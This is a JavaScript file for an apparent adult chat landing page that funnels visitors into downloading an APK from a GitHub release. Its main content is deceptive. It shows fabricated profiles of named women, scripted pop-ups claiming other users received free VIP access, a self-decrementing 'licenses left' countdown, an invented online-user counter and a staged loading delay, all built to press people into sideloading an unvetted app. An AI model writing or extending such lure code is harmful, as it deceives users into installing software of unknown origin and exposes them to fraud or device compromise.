// APK Download Link (KEPT SAME AS REQUESTED)
const APK_LINK = "https://github.com/navirihan7-collab/Desi-desire-apk/releases/download/Demon/Desi.Desire.apk";

// Profiles Data
const profiles = [
    { name: "Priya 🔥 Online", img: "https://desidesire.lovestoblog.com/Images/png1.jpg", status: "live" },
    { name: "Sneha 💋 Live Now", img: "https://desidesire.lovestoblog.com/Images/png3.jpg", status: "live" },
    { name: "Anjali ✨ Waiting", img: "https://desidesire.lovestoblog.com/Images/png5.jpg", status: "online" },
    { name: "Riya ❤️ Hot", img: "https://desidesire.lovestoblog.com/Images/png8.jpg", status: "live" },
    { name: "Pooja 🔥 Active", img: "https://desidesire.lovestoblog.com/Images/png7.jpg", status: "live" },
    { name: "Neha 💕 Online", img: "https://desidesire.lovestoblog.com/Images/png4.jpg", status: "online" },
    { name: "Simran ✨ Live", img: "https://desidesire.lovestoblog.com/Images/png1.jpg", status: "live" },
    { name: "Kavya 🔥 Hot", img: "https://desidesire.lovestoblog.com/Images/png3.jpg", status: "live" }
];

// Notification Messages
const notifications = [
    "Rahul from Delhi just connected with Priya! 🎉",
    "Sumit started VIP Video Call! 📱",
    "3 users from Mumbai claimed FREE VIP! 🔥",
    "Aryan unlocked Lifetime Premium Access! 👑",
    "Aakash matched with Sneha instantly! 💕",
    "Vikram downloaded & started chatting! ⚡",
    "Rohit just got VIP access FREE! 🎁",
    "Someone near you started video call! 📲"
];

// Initialize
document.addEventListener('DOMContentLoaded', function() {
    loadProfiles();
    startCounters();
    startNotifications();
    initScrollEffects();
    initClickHandlers();
});

// Load Profiles
function loadProfiles() {
    const container = document.getElementById('profilesContainer');
    profiles.forEach(profile => {
        const statusClass = profile.status === 'live' ? 'profile-tag live' : 'profile-tag online';
        const statusIcon = profile.status === 'live' ? '🔴 LIVE' : '🟢 ONLINE';
        
        container.innerHTML += `
            <div class="profile-card" onclick="downloadAPK()">
                <img src="${profile.img}" class="profile-img" alt="${profile.name}" loading="lazy">
                <div class="${statusClass}">${statusIcon}</div>
                <div class="profile-name">${profile.name}</div>
            </div>
        `;
    });
}

// Download APK Function
function downloadAPK() {
    showLoading();
    setTimeout(() => {
        window.open(APK_LINK, '_blank');
        hideLoading();
    }, 1500);
}

// Counters & Animations
function startCounters() {
    // License countdown
    let licenses = 47;
    setInterval(() => {
        licenses = Math.max(1, licenses - 1);
        document.getElementById('countdown').textContent = licenses;
    }, 25000);

    // Progress bar
    let progress = 92;
    const progressFill = document.getElementById('progressFill');
    const progressText = document.getElementById('progressPercent');
    
    setInterval(() => {
        progress = Math.min(99, progress + 0.5);
        progressFill.style.width = progress + '%';
        progressText.textContent = Math.floor(progress) + '%';
    }, 8000);

    // Online users counter
    let onlineCount = 1247;
    setInterval(() => {
        onlineCount += Math.floor(Math.random() * 10) - 3;
        onlineCount = Math.max(1200, onlineCount);
        document.getElementById('onlineCount').textContent = onlineCount.toLocaleString();
    }, 5000);
}

// Notifications
function startNotifications() {
    setTimeout(showNotification, 2000);
    setInterval(showNotification, 7000);
}

function showNotification() {
    const popup = document.getElementById('notificationPopup');
    const msgElement = document.getElementById('notificationMsg');
    
    const randomMsg = notifications[Math.floor(Math.random() * notifications.length)];
    msgElement.textContent = randomMsg;
    
    popup.style.display = 'block';
    setTimeout(() => {
        popup.style.display = 'none';
    }, 4500);
}

// Scroll Effects
function initScrollEffects() {
    let lastScroll = 0;
    window.addEventListener('scroll', () => {
        const sticky = document.getElementById('stickyDownload');
        if (window.scrollY > 300) {
            sticky.classList.add('active');
        } else {
            sticky.classList.remove('active');
        }
        
        lastScroll = window.scrollY;
    });
}

// Click Handlers
function initClickHandlers() {
    // All download buttons
    document.querySelectorAll('a[href="' + APK_LINK + '"]').forEach(btn => {
        btn.addEventListener('click', (e) => {
            e.preventDefault();
            downloadAPK();
        });
    });

    // Main download button enhanced effect
    document.getElementById('mainDownload').addEventListener('click', (e) => {
        e.preventDefault();
        // Add click animation
        e.target.style.transform = 'scale(0.95)';
        setTimeout(() => {
            e.target.style.transform = '';
            downloadAPK();
        }, 150);
    });
}

// Loading Overlay
function showLoading() {
    document.getElementById('loadingOverlay').style.display = 'flex';
}

function hideLoading() {
    document.getElementById('loadingOverlay').style.display = 'none';
}

// Prevent zoom on double tap
let lastTouchEnd = 0;
document.addEventListener('touchend', function (event) {
    const now = (new Date()).getTime();
    if (now - lastTouchEnd <= 300) {
        event.preventDefault();
    }
    lastTouchEnd = now;
}, false);

// PWA-like behavior
window.addEventListener('beforeinstallprompt', (e) => {
    // Could be used for PWA install prompt
});
